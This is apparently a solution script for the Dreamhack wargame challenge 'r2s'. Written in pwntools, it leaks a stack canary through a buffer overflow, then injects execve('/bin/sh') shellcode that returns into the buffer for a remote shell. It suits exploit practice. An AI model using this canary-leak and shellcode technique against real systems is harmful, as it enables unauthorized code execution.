#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 18289
HOST = "host3.dreamhack.games"
exe = context.binary = ELF('./r2s', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b*main+244
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

p.recvuntil(b"buf: ")
buf_addr = int(p.recvline()[:-1], 16)
offset = 96
log.info("buffer: " + hex(buf_addr))


# Stage 1: 

pl = b"A"*(offset - 8 + 1)

p.sendafter(b"Input: ", pl)
p.recvuntil(pl)
canary = u64(b'\x00' + p.recv(7))
log.info("canary: " + hex(canary))

# Stage 2:

sc = asm('''
    mov rbx, 29400045130965551
    push rbx
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    syscall
    ''', arch = 'amd64')

pl = flat(
    sc.ljust((offset - 8), b"A"),
    canary,
    b"B"*8,
    buf_addr
    )
# GDB()
p.sendafter(b"Input: ", pl)


p.interactive()
